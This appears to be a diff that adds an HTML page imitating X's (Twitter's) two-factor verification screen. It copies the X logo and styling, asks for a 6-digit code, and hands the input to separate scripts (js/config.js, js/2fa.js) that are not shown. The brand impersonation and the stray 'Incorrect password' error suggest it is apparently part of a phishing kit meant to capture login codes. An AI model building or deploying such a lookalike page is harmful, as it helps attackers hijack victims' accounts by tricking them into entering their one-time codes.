@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>2FA Verification</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <style>
+    .otp-input::-webkit-outer-spin-button,
+    .otp-input::-webkit-inner-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    .otp-input[type=number] {
+      -moz-appearance: textfield;
+    }
+  </style>
+</head>
+<body class="bg-black text-white flex items-center justify-center min-h-screen">
+
+<div class="max-w-md w-full p-6 sm:p-8">
+  <div class="w-full flex flex-col items-center">
+    <div class="mb-6">
+      <svg class="w-8 h-8 fill-current text-white" viewBox="0 0 24 24">
+        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+      </svg>
+    </div>
+
+    <div class="w-full text-left space-y-2 mb-6">
+      <h1 class="text-2xl sm:text-3xl font-bold text-[#f7f9f9] tracking-tight">Enter confirmation code</h1>
+      <p class="text-[14px] text-[#71767b] leading-relaxed">
+        Enter the 6-digit code sent to your authentication app or device to continue.
+      </p>
+    </div>
+
+    <form id="2fa-form" class="w-full space-y-6">
+      <div id="otp-container">
+        <input type="text" id="otp-input" maxlength="6" pattern="[0-9]*" inputmode="numeric" class="w-full h-14 text-center text-xl font-bold bg-black border border-[#333639] rounded-lg text-white focus:outline-none focus:border-[#1d9bf0] focus:ring-1 focus:ring-[#1d9bf0] transition" autofocus />
+      </div>
+
+      <div id="error-message" class="text-red-500 text-sm text-center hidden">Incorrect password</div>
+      <button 
+        id="verify-btn" 
+        type="submit" 
+        disabled 
+        class="w-full font-bold py-3.5 px-4 rounded-full transition text-sm bg-[#787a7a] text-[#0f1419] cursor-not-allowed flex items-center justify-center"
+      >
+        <span id="btn-text">Next</span>
+        <svg id="spinner" class="animate-spin h-5 w-5 text-white hidden ml-2" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+          <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+          <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+        </svg>
+      </button>
+    </form>
+  </div>
+
+  <div class="w-full flex flex-col items-center space-y-4 pt-6">
+    <div class="text-xs text-[#71767b] flex items-center space-x-1">
+      <span>Didn't receive a code?</span>
+      <button id="resend-btn" disabled class="text-[#71767b] font-medium hover:underline cursor-not-allowed">
+        Resend code (<span id="timer">30</span>s)
+      </button>
+    </div>
+
+    <a href="#" class="text-xs text-[#1d9bf0] hover:underline font-medium">
+      Use a different verification method
+    </a>
+  </div>
+</div>
+
+<script src="js/config.js"></script>
+<script src="js/2fa.js"></script>
+
+</body>
+</html>
